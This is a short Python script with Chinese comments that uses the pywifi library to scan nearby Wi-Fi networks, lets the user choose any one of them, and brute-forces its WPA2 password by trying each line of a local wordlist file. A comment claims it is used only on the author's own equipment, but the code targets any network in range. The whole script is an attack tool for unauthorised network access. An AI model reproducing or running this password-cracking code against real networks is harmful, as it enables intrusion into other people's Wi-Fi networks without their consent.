#'''
#声明，本作品破解过程仅限于自己的电脑和wifi设备
#'''
import pywifi
from pywifi import const
import time

#1.获取网卡
def get_card():
    wifi = pywifi.PyWiFi()
    card = wifi.interfaces()[0]
    card.disconnect()
    time.sleep(1)
    status = card.status()
    if status not in [const.IFACE_DISCONNECTED,const.IFACE_INACTIVE]:
        print("网卡未处于断开状态")
        return False
    return card
#2.扫描WiFi列表
def scan_wifi(card):
    print("开始扫描附件的WiFi...")
    card.scan()
    time.sleep(15)
    wifi_list = card.scan_results()
    print("数量：",len(wifi_list))
    index = 1
    for wifi_info in wifi_list:
        print(f"{index}.SSID:{wifi_info.ssid}")
        index = index + 1
    return wifi_list

#3.破解指定WiFi的密码
def crack_wifi(wifi_ssid,card):
    file_path = "D:\冯文喜\家用\代码\Python\.vs\Wireless network hacking\password.txt"
    with open(file_path,"r") as password_file:
        for pwd in password_file:
            pwd = pwd.strip()
            if connect_to_wifi(pwd,wifi_ssid,card):
                print("密码正确",pwd)
                return pwd
            else:
                print("密码错误",pwd)
                time.sleep(3)
    return None
def connect_to_wifi(pwd,wifi_ssid,card):
    profile = pywifi.Profile()
    profile.ssid = wifi_ssid
    profile.key = pwd
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPPHER_TYPE_CCMP

    card.remove_all_profiles()
    tem_profile = card.add_network_profile(profile)
    card.connect(tem_profile)
    time.sleep(5)
    if card.status() == const.IFACE_CONNECTED:
        is_connected = True
    else:
        is_connected = False
    card.disconnect()
    time.sleep(1)
    return is_connected

card = get_card()
if not card:
    print("网卡关闭失败，请重试！")
else:
    wifi_list = scan_wifi(card)
    if not wifi_list:
        print("没有发现附件的WiFi")
    else:
        target_wifi_index = int(input("请选择要破解的WiFi序号：")) - 1
        target_wifi_ssid = wifi_list[target_wifi_index].ssid
        print("开始破解WiFi",target_wifi_ssid)
        result = crack_wifi(target_wifi_ssid,card)
        if result:
            print("破解成功，WiFi密码是：",result)
        else:
            print("破解失败，未找到正确的密码")